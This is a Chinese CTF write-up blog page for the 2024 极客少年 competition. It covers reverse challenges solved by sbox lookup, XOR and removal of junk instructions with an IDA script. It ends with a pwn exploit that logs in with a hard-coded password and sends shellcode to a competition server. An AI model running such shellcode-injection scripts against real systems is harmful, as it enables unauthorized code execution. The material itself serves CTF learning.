@@ -1,0 +1,443 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="dark"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>2024 极客少年 WP（little re sbox 还原 + BeautifulFlower XOR） | PUDONG LAB</title><meta name="author" content="朴冬,2559874620@qq.com/tyjiang@stu.xjtu.edu.cn"><meta name="copyright" content="朴冬"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#0d0d0d"><meta name="description" content="极客少年 Reverse 两题：little re sbox 320 字节逆查 + BeautifulFlower XOR i + 花指令动态调试 — 都是逆向入门级查表&#x2F;异或。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="2024 极客少年 WP（little re sbox 还原 + BeautifulFlower XOR）">
+<meta property="og:url" content="https://pudong617.github.io/2024/01/01/ctf-kb/wp/Reverse/2024%E6%9E%81%E5%AE%A2%E5%B0%91%E5%B9%B4WP/">
+<meta property="og:site_name" content="PUDONG LAB">
+<meta property="og:description" content="极客少年 Reverse 两题：little re sbox 320 字节逆查 + BeautifulFlower XOR i + 花指令动态调试 — 都是逆向入门级查表&#x2F;异或。">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://pudong617.github.io/img/youli.png">
+<meta property="article:published_time" content="2023-12-31T16:00:00.000Z">
+<meta property="article:modified_time" content="2023-12-31T16:00:00.000Z">
+<meta property="article:author" content="朴冬">
+<meta property="article:tag" content="sbox 320 字节查找表">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://pudong617.github.io/img/youli.png"><link rel="shortcut icon" href="/img/PU-LOGO.png"><link rel="canonical" href="https://pudong617.github.io/2024/01/01/ctf-kb/wp/Reverse/2024%E6%9E%81%E5%AE%A2%E5%B0%91%E5%B9%B4WP/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=4.13.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.5.1/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"找不到您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
+  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"簡"},
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.11.1/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: true,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '2024 极客少年 WP（little re sbox 还原 + BeautifulFlower XOR）',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2024-01-01 00:00:00'
+}</script><script>(win=>{
+      win.saveToLocal = {
+        set: (key, value, ttl) => {
+          if (ttl === 0) return
+          const now = Date.now()
+          const expiry = now + ttl * 86400000
+          const item = {
+            value,
+            expiry
+          }
+          localStorage.setItem(key, JSON.stringify(item))
+        },
+      
+        get: key => {
+          const itemStr = localStorage.getItem(key)
+      
+          if (!itemStr) {
+            return undefined
+          }
+          const item = JSON.parse(itemStr)
+          const now = Date.now()
+      
+          if (now > item.expiry) {
+            localStorage.removeItem(key)
+            return undefined
+          }
+          return item.value
+        }
+      }
+    
+      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        script.onerror = reject
+        script.onload = script.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          script.onload = script.onreadystatechange = null
+          resolve()
+        }
+
+        Object.keys(attr).forEach(key => {
+          script.setAttribute(key, attr[key])
+        })
+
+        document.head.appendChild(script)
+      })
+    
+      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onerror = reject
+        link.onload = link.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          link.onload = link.onreadystatechange = null
+          resolve()
+        }
+        document.head.appendChild(link)
+      })
+    
+      win.activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+        if (t === 'dark') activateDarkMode()
+        else if (t === 'light') activateLightMode()
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+      const detectApple = () => {
+        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+          document.documentElement.classList.add('apple')
+        }
+      }
+      detectApple()
+    })(window)</script><style>
+  /* 冷色极光渐变背景：与主题主色 #49B1F5 / #00C4B6 同色系 */
+  html #web_bg {
+    background-color: #F5FAFF;
+    background-image:
+      radial-gradient(1200px 700px at 12% -10%, rgba(73, 177, 245, .55), transparent 60%),
+      radial-gradient(1000px 650px at 92% 15%, rgba(0, 196, 182, .40), transparent 60%),
+      radial-gradient(900px 560px at 68% 108%, rgba(255, 114, 66, .16), transparent 62%),
+      linear-gradient(155deg, #E3F2FF 0%, #F6FBFF 45%, #E4F8F2 100%);
+  }
+  /* 暗色模式：同构图，降低光斑强度 */
+  html[data-theme='dark'] #web_bg {
+    background-color: #0B121A;
+    background-image:
+      radial-gradient(1100px 700px at 10% -8%, rgba(73, 177, 245, .45), transparent 62%),
+      radial-gradient(1000px 620px at 92% 12%, rgba(0, 196, 182, .32), transparent 62%),
+      radial-gradient(800px 520px at 72% 105%, rgba(255, 114, 66, .10), transparent 60%),
+      linear-gradient(160deg, #0B121A 0%, #0C1A24 50%, #0A1E20 100%);
+  }
+</style>
+<link rel="stylesheet" href="/css/custom.css"><meta name="generator" content="Hexo 7.3.0"></head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/youli.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">1050</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">879</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">16</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 文章</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 分享</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> Music</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> Movie</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> LINK</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg fixed" id="page-header" style="background: radial-gradient(1100px 620px at 18% 8%, rgba(73, 177, 245, .55), transparent 60%), radial-gradient(900px 520px at 82% 22%, rgba(0, 196, 182, .45), transparent 62%), radial-gradient(700px 460px at 55% 108%, rgba(255, 114, 66, .18), transparent 60%), linear-gradient(155deg, #0A1A2B 0%, #0E3049 48%, #083F45 100%)"><nav id="nav"><span id="blog-info"><a href="/" title="PUDONG LAB"><img class="site-icon" src="/img/pudong.png"/></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 文章</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 分享</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> Music</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> Movie</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> LINK</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">2024 极客少年 WP（little re sbox 还原 + BeautifulFlower XOR）</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-12-31T16:00:00.000Z" title="发表于 2024-01-01 00:00:00">2024-01-01</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-12-31T16:00:00.000Z" title="更新于 2024-01-01 00:00:00">2024-01-01</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/CTF%E7%9F%A5%E8%AF%86%E5%BA%93/">CTF知识库</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/CTF%E7%9F%A5%E8%AF%86%E5%BA%93/WP/">WP</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/CTF%E7%9F%A5%E8%AF%86%E5%BA%93/Reverse/">Reverse</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="2024 极客少年 WP（little re sbox 还原 + BeautifulFlower XOR）"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><blockquote>
+<p>原文: <a target="_blank" rel="noopener" href="https://www.ctfiot.com/197916.html">https://www.ctfiot.com/197916.html</a><br>ID: 197916</p>
+</blockquote>
+<p>赛题链接(部分)：</p>
+<p><a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1atitTM8xdO66ldb2eYcv7w?pwd=1234">https://pan.baidu.com/s/1atitTM8xdO66ldb2eYcv7w?pwd=1234</a></p>
+<p>动态靶场环境可进i春秋训练营启动靶机。</p>
+<p>作者：朝雾，upsw1ng，pw，blonet，Y0n3er，DexterJie，LingFeng</p>
+<p>Reverse</p>
+<p>01</p>
+<p>little re</p>
+<p>sbox&#x3D;[get_wide_byte(0x403040+i) for i in range(320)]v5&#x3D;[0x18, 0x10, 0xcf, 0xe6, 0x16, 0x5b, 0x4e, 0xe6, 0x2c, 0x87, 0x91, 0x92, 0x1b, 0xaa, 0x8, 0xee, 0xd6, 0x70, 0x74, 0x42, 0xe9, 0x7, 0x7, 0x46, 0xd6, 0x16, 0x2a, 0x42, 0xfa, 0x6c, 0x89, 0xe7, 0x2d, 0x29, 0x53, 0x60, 0xc5, 0xa, 0x4d, 0x53, 0xc5, 0x15]l&#x3D;[]for i in range(len(v5)):    l.append(chr(sbox.index(v5[i])^i))print(‘’.join(l))</p>
+<p>02</p>
+<p>BeautifulFlower</p>
+<p>分析主函数，可以发现，其实关键的加密步骤就是异或一个 i（Line 17-21）</p>
+<p>在29行，我们发现有一个形如*(baseaddr+index)的比较，猜测这就是一个strcmp；</p>
+<p>由于题目存在花指令，所以这里没有以cip[i]&#x3D;&#x3D;str[i]这种形式出现</p>
+<p>但是，我们仍然可以使用动态调试的方法拿到密文在Line 29使用Tab键读一下汇编。</p>
+<p>.text:<br>00007FF674AA2348 83 7C 24 20 30                cmp     [rsp+30h+var_10], 30h ; ‘0’.text:<br>00007FF674AA234D 0F 8D 75 00 00 00             jge     loc_7FF674AA23C8.text:<br>00007FF674AA234D.text:<br>00007FF674AA2353 E8 28 FB FF FF                call    sub_7FF674AA1E80.text:<br>00007FF674AA2353.text:<br>00007FF674AA2358 48 63 4C 24 20                movsxd  rcx, [rsp+30h+var_10].text:<br>00007FF674AA235D 48 B8 AB 24 93 C5 55 7B A0 F1 mov     rax, 0F1A07B55C59324ABh.text:<br>00007FF674AA2367 48 03 05 DA 8C 02 00          add     rax, cs:<br>off_7FF674ACB048.text:<br>00007FF674AA236E 0F BE 04 08                   movsx   eax, byte ptr [rax+rcx].text:<br>00007FF674AA2372 48 63 54 24 20                movsxd  rdx, [rsp+30h+var_10].text:<br>00007FF674AA2377 48 B9 45 AB 81 9C 0C 46 B9 0C mov     rcx, 0CB9460C9C81AB45h.text:<br>00007FF674AA2381 48 03 0D C8 8C 02 00          add     rcx, cs:<br>off_7FF674ACB050.text:<br>00007FF674AA2388 0F BE 0C 11                   movsx   ecx, byte ptr [rcx+rdx].text:<br>00007FF674AA238C 39 C8                         cmp     eax, ecx.text:<br>00007FF674AA238E 0F 84 1F 00 00 00             jz      loc_7FF674AA23B3.text:<br>00007FF674AA238E.text:<br>00007FF674AA2394 B9 0A 00 00 00                mov     ecx, 0Ah.text:<br>00007FF674AA2399 E8 52 00 00 00                call    sub_7FF674AA23F0.text:<br>00007FF674AA2399.text:<br>00007FF674AA239E 48 89 C1                      mov     rcx, rax                        ; Buffer.text:<br>00007FF674AA23A1 E8 66 63 00 00                call    puts.text:<br>00007FF674AA23A1.text:<br>00007FF674AA23A6 C7 44 24 2C 00 00 00 00       mov     [rsp+30h+var_4], 0.text:<br>00007FF674AA23AE E9 27 00 00 00                jmp     loc_7FF674AA23DA.text:<br>00007FF674AA23AE.text:<br>00007FF674AA23B3                               ; —————————————————————————.text:<br>00007FF674AA23B3.text:<br>00007FF674AA23B3                               loc_7FF674AA23B3:                       ; CODE XREF: main+13E↑j.text:<br>00007FF674AA23B3 E9 00 00 00 00                jmp     $+5.text:<br>00007FF674AA23B3.text:<br>00007FF674AA23B8                               ; —————————————————————————.text:<br>00007FF674AA23B8.text:<br>00007FF674AA23B8                               loc_7FF674AA23B8:                       ; CODE XREF: main:<br>loc_7FF674AA23B3↑j.text:<br>00007FF674AA23B8 8B 44 24 20                   mov     eax, [rsp+30h+var_10].text:<br>00007FF674AA23BC 83 C0 01                      add     eax, 1.text:<br>00007FF674AA23BF 89 44 24 20                   mov     [rsp+30h+var_10], eax.text:<br>00007FF674AA23C3 E9 80 FF FF FF                jmp     loc_7FF674AA2348</p>
+<p>阅读可知，这里是写的一个字节比较。</p>
+<p>关键的比较是这个</p>
+<p>.text:<br>00007FF674AA238C 39 C8                                    cmp     eax, ecx</p>
+<p>将eax的值与ecx进行比较，继续分析eax</p>
+<p>eax&#x3D;</p>
+<p>[0x0F1A07B55C59324AB+[0x7FF674ACB048]+rcx]</p>
+<p>这里的rcx可以理解为循环计次变量i，也可以说是索引号，猜测这里的eax依次可能是我们输入的字符串内容，然后是</p>
+<p>ecx&#x3D;[0x0CB9460C9C81AB45+[0x7FF674ACB050+]+rdx]，</p>
+<p>同理，这里的rdx是索引号，构建一个伪机器码</p>
+<p>“flag{abcdefghijklmnopqwertyuiopasdfghjklzxcvbnm}”动态调试发现闪退，猜测有反调试。</p>
+<p>导入表IAT，发现有IsDebuggerPresent()函数</p>
+<p>如图所示</p>
+<p>继续再看</p>
+<p>在.text:<br>00007FF674AA236E </p>
+<p>movsx   eax, byte ptr [rax+rcx]下断</p>
+<p>跟进rax，可以看到就是对我们输入的内容异或了i</p>
+<p>测试一下，证明就是异或的i：</p>
+<p>Python&gt;print(‘’.join([chr(ord(test[i])^i) for i in range(len(test))]))fmcddddlllldddd||||ddarjmcnurn~SEDDLOMKRQI]NCCR</p>
+<p>print(‘’.join([chr(get_wide_byte(0x7FF674ACB000+i)^i) for i in range(0x30)]).replace(“&amp;”,”x”))</p>
+<p>后记</p>
+<p>对于其花指令的分析，这里给出分析步骤：</p>
+<p>可以参考笔者的文章：</p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/14625">https://xz.aliyun.com/t/14625</a></p>
+<p>下面的等价解释和几个变式两个部分，我们以32位下的寄存器来解释，64位的请类比。</p>
+<p>一、等价解释</p>
+<p>下面给出一种常见的等价变换：</p>
+<p>1.call</p>
+<p>对于call指令，需要格外重视的是，它等价于</p>
+<p>push next opcodeAddr;jmp addr;</p>
+<p>2.retn</p>
+<p>retn一般出现在call进的函数里面，一般用作函数的返回，当然，其后面也可以接值。</p>
+<p>比如retn 0x5其等价于：mov eip,[esp];add esp,0x4+0x5;</p>
+<p>3.call 0h</p>
+<p>16进制为：E8 00 00 00 00这种指令常用来获取下一行代码的地址，也可用于获取eip的值。</p>
+<p>004710D5 &gt;    E8 00000000   call 11111.004710DA004710DA  |.  68 10B14900   push 11111.0049B110这里执行call后，eip的值为004710DAh，而此时[esp]的值，就是0x4710DAh，因此获取call时的eip就是[esp]-0x5;</p>
+<p>二、几个变式</p>
+<p>1.修改eip</p>
+<p>我们知道，想要eip寄存器值得到修改，直接通过mov eip,addr是不可能给的，我们首先想到的是jmp addr那么此外，还有什么能实现类似修改eip的呢，那就是retn</p>
+<p>push addrretn</p>
+<p>也能实现修改eip的效果</p>
+<p>2.改变esp</p>
+<p>对于esp，大多数就是和栈有关，push，pop，call，retn，以及 直接对栈寄存器（ebp和esp）进行赋值或运算我们这里来说一说这个如何抬栈（增加esp）</p>
+<p>方法一：add</p>
+<p>方法二：多个pop</p>
+<p>对于pop指令，例：pop eax;在x86程序里面就等价于</p>
+<p>mov eax,[esp];add esp,0x4;</p>
+<p>但这样会占用一个寄存器，当成临时存储的地方。因此，当某个寄存器没有实际作用的时候，可以用多个pop,来代替add esp;</p>
+<p>三、具体分析</p>
+<p>（1）长链跳转（pop组合）</p>
+<p>从最上面的函数一个一个看sub_140001A40()—&gt;0x140001A4E</p>
+<p>.text:<br>0000000140001A4E.text:<br>0000000140001A4E                               loc_140001A4E:                        .text:<br>0000000140001A4E 55                            push    rbp.text:<br>0000000140001A4F E8 00 00 00 00                call    $+5.text:<br>0000000140001A4F.text:<br>0000000140001A54 48 83 04 24 10                add     qword ptr [rsp], 10h.text:<br>0000000140001A59 EB 00                         jmp     short $+2.text:<br>0000000140001A59.text:<br>0000000140001A5B                               ; ——————————.text:<br>0000000140001A5B.text:<br>0000000140001A5B                               loc_140001A5B:                       .text:<br>0000000140001A5B 41 59                         pop     r9.text:<br>0000000140001A5D 41 FF D1                      call    r9</p>
+<p>首先push rbp我们可以理解为一个函数的开始，这边跟花指令没有关系。从call 000000h(call    $+5)开始，我们来分析：</p>
+<p>首先这个call 是把下一个opcode的地址压入栈中，即执行完后，栈顶([rsp])&#x3D;0x140001A54 </p>
+<p>add     qword ptr [rsp], 10h,这里做了一个加法，[rsp]+&#x3D;0x10，也就是栈顶([rsp])&#x3D;0x140001A64</p>
+<p>jmp short $+2(EB 00)这个跳转没什么用其实，就是按顺序执行下一行代码</p>
+<p>pop r9 这里把栈顶上的[rsp]，弹出来了，也就是说，执行过程相当于，r9&#x3D;[rsp]&#x3D;0x140001A64 ;rsp-&#x3D;0x8；这里其实就把rsp还原成没执行call 00h之前了；</p>
+<p>call r9；这里就是把控制流干到r9，即rip&#x3D;r9&#x3D;0x140001A64，同时栈顶压入下一行的地址，即[rsp]&#x3D;0x140001A60;</p>
+<p>因此，我们重新自己处理下汇编代码，分开代码和脏数据，就能得到下图</p>
+<p>6.pop r9；这里把栈顶上的[rsp]，弹出来了，也就是说，执行过程相当于，r9&#x3D;[rsp]&#x3D;0x140001A60，rsp-&#x3D;0x8，这里栈又还原成一开始的样子了。</p>
+<p>综上，这里使用了pop的方式来add rsp；通过修改栈顶([rsp])来实现跳转；r9作为中间寄存器，会因为pop，原始值会被破坏。</p>
+<p>因此，0x140001A4F-0x140001A63没有任何作用，只是通过几个骚操作，让程序往下面的控制流执行罢了。</p>
+<p>这一串花指令可以概括为：call 000h；add [esp],xxxxx；jmp short addr；dbs；pop reg；call reg；dbs；pop reg；</p>
+<p>（2）jx+jnx型</p>
+<p>接着就是一个双条件跳转，恒成立其一，必跳到同一地址，跨过脏字节，其格式为下面这样：</p>
+<p>start:    jx label2    jnx label2    db 0x1    db 0x2    db …label2:    正常指令</p>
+<p>如图是典型的这种情况：</p>
+<p>因此0x140001A6B-0x140001A78是花指令。</p>
+<p>（3）长链跳转（retn）</p>
+<p>紧接着，</p>
+<p>这个其实跟最上面分析的那种差不多，就是改栈顶指针来跳转；区别的是使用了retn来改变rip和恢复栈</p>
+<p>call loc+7 这里就是rip来到了0x140001A84，同时压栈，栈顶[rsp]&#x3D;0x140001A82;</p>
+<p>add qword ptr [rsp],0xb [rsp]+&#x3D;0xb，则[rsp]&#x3D;0x140001A8d;</p>
+<p>retn 根据retn的等价解释，此时就是rip来到了栈顶([rsp])的值&#x3D;0x140001A8d，同时弹出这个值；所以可以理解为，retn就是pop rip,这里又什么都没做。</p>
+<p>0x140001A7d-0x140001A8c都是没用的；</p>
+<p>这个类型可以概括为call loc+x；db(x-5)；add [rsp],x+1+p；retn；dbp；</p>
+<p>（4）jmp db型</p>
+<p>最简单的jmp跳过脏字节；</p>
+<p>（5）call+retn</p>
+<p>.text:<br>0000000140001A9F E8 F1 FF FF FF                call    nullsub_14</p>
+<p>这里call 了一个空函数，空函数内容为：</p>
+<p>需要注意的是，这里的nullsub的汇编可能在jmp db型花指令的db里面所以这个call只是个占位的，多余指令</p>
+<p>（6）长链跳转（保存现场）</p>
+<p>在之前我们讲到，通过pop来弹栈时，会破坏寄存器；比如这里的</p>
+<p>.text:<br>0000000140001AB0 41 58                         pop     r8</p>
+<p>这个就是为了让栈还原，而使用的pop，但是这样会把栈顶[rsp]的值给r8，就破坏了r8的值；</p>
+<p>为了解决这个问题，这里先在call之前push r8；</p>
+<p>这样就把r8的值保存在栈中，再最后pop出来就可以实现还原。</p>
+<p>两个pop r8的作用分别是（恢复call压的栈，还原r8）；</p>
+<p>那么对此，从0x140001AAA-0x140001AB3也没什么用。</p>
+<p>这种形式，可以总结为：push reg；call loc+x；dbs*(x-5)；pop reg；pop reg；</p>
+<p>四、去花脚本</p>
+<p>import ida_bytes, ida_idastart&#x3D;0x140001A4Eend&#x3D;  0x140003f76<br>def patch(ea, num&#x3D;1):    for i in range(num):        ida_bytes.patch_byte(ea + i, 0x90)    return<br>def f(hexStr):    begin_addr&#x3D;start    end_addr&#x3D;end    l &#x3D; []    xx &#x3D; len(hexStr) &#x2F;&#x2F; 3 + 1    bMask &#x3D; bytes.fromhex(hexStr.replace(‘00’, ‘01’).replace(‘??’, ‘00’))    bPattern &#x3D; bytes.fromhex(hexStr.replace(‘??’, ‘00’))    signs &#x3D; ida_bytes.BIN_SEARCH_FORWARD | ida_bytes.BIN_SEARCH_NOBREAK | ida_bytes.BIN_SEARCH_NOSHOW    while begin_addr &lt; end_addr:        ea &#x3D; ida_bytes.bin_search(begin_addr, end_addr, bPattern, bMask, 1, signs)        if ea &#x3D;&#x3D; ida_idaapi.BADADDR:            break        else:            l.append(ea)            begin_addr &#x3D; ea + xx    return lg&#x3D;lambda x,num:[print(hex(x), hex(num)),patch(x, num)]print(“———-jx+jnx—————-“)for x in f(“74 ?? 75 ??”):    num &#x3D; get_wide_byte(x + 3) + 4    g(x,num)print(“———-jump far(pop)———-“)for x in f(“E8 00 00 00 00 48 83 04 24”):    num &#x3D; get_wide_byte(x + 9)+5    t&#x3D;get_wide_byte(x+num)    if t in [0x58,0x59]:        num+&#x3D;1    elif t&#x3D;&#x3D;0x41:        num+&#x3D;2    else:        print(“Special:”,hex(x+num))        continue    g(x,num)print(“—–jump far(retn)&amp;&amp;Jump far(Protect site)———“)for x in f(“E8 ?? 00 00 00”):    dbs &#x3D; get_wide_byte(x + 1)    if dbs &lt; 0x15:        if get_wide_byte(x - 1) in [0x50, 0x51] and get_wide_byte(x + dbs + 5) in [0x58, 0x59]:            x -&#x3D; 1            num &#x3D; dbs + 8        elif get_wide_byte(x - 1) in list(range(0x50, 0x58)) and get_wide_byte(x + dbs + 5) &#x3D;&#x3D; 0x41:            x -&#x3D; 2            num &#x3D; 11 + dbs        else:            num &#x3D; 5 + get_wide_byte(x + dbs + 9)        print(hex(x), num)        g(x, num)print(“———jump db————-“)for x in f(“E9 ?? 00 00 00”):    t&#x3D;get_wide_byte(x+1)    if t&lt;20:        num&#x3D;t+5        g(x,num)print(“———call null function———“)for x in f(“E8 ?? FF FF FF”):    g(x,5)print(“ojbk!”)</p>
+<p>五、大梦一场空</p>
+<p>用CFF Explorer可以去掉ASLR，方便后续动调研究花指令。找到可选头里面的DllCharacteristics将其值里面的Dll can move给取消掉，再保存。</p>
+<p>一开始以为反调试可能存在于Tls回调或者CRT载入里面的初始化中，但没找到，考虑又有花指令。</p>
+<p>故猜测，是main()–&gt;func()—&gt;IsDebuggerPresent()从Start()—__scrt_common_main_seh()–&gt;main()可以定位到主函数。</p>
+<p>去完花之后，这里可以印证上面所说的反调试情况（main()–&gt;func()—&gt;IsDebuggerPresent() ），如图：</p>
+<p>观察其他指令，大多都是AVX,SSE指令集，伪代码压根看不出来什么名堂。</p>
+<p>归根到底去了个寂寞。</p>
+<p>六、备注</p>
+<p>至于main函数里面几个没有符号的函数，猜测这些函数主要可能是下面几种情况：</p>
+<p>自定义的解密函数，用于将对应索引的字符串解密，备注：这里静态分析，确实在字符串里面没有搜到显示在命令行上的字符串；这里出题人犯了一个错误，出题人本质上是想让关键函数不能被识别出来的，也就是说在main里面插花，但是这样可以通过对提示字符串交叉引用，去找到main函数。所以出题人用函数来动态生成提示字符串去规避找个做题技巧。</p>
+<p>IO函数，用于输入输出；</p>
+<p>C++的Operate::</p>
+<p>本题使用了AVX指令集，因此需要确保CPU支持该指令集！</p>
+<p>PWN</p>
+<p>01</p>
+<p>ezpwn</p>
+<p>puts(“1. Login as Admin”);puts(“2. Send Message to Admin”);puts(“3. Exit”);if ( isAdmin &#x3D;&#x3D; 1 )puts(“4. Exec”);<br>return printf(“&gt; “);</p>
+<p>最终肯定是要exec的，exec要满足 isAdmin&#x3D;&#x3D;1；</p>
+<p>分析发现 is Admin是在login里面赋值为1的，条件是密码正确，为”SuperSecurePassword123!”</p>
+<p>所以攻击链为：SendData(2)–&gt;v5置0–&gt;Login(1)–&gt;Send(pwd)–&gt;isAdmin置1–&gt;Exec(shellcode)</p>
+<p>然后exec函数，是直接将输入的shellcode执行的</p>
+<p>from pwn import*from libnum import *from ctypes import *from z3 import *import requests as reqs&#x3D;lambda x:p.send(x)sl&#x3D;lambda x:p.sendline(x)sa&#x3D;lambda x,y:p.sendafter(x,y)sla&#x3D;lambda x,y:p.sendlineafter(x,y)r&#x3D;lambda :p.recv()rl&#x3D;lambda :p.recvline()ru&#x3D;lambda x:p.recvuntil(x)context.clear(arch&#x3D;’amd64’, os&#x3D;’linux’, log_level&#x3D;’debug’)url&#x3D;’101.200.238.173’port&#x3D;34948p&#x3D;remote(url,port)shellcode&#x3D;asm(shellcraft.sh())lin&#x3D;[b’&gt; ‘]*3+[b’Password: ‘,b’&gt; ‘,b’Shellcode: ‘]lsend&#x3D;[b’2’,b’a’*56,b’1’,b’SuperSecurePassword123!’,b’4’,shellcode]for i in range(len(lin)):    ru(lin[i])    print(lin[i],lsend[i])    sl(lsend[i])p.interactive()</p>
+<p>02</p>
+<p>OrangeForce</p>
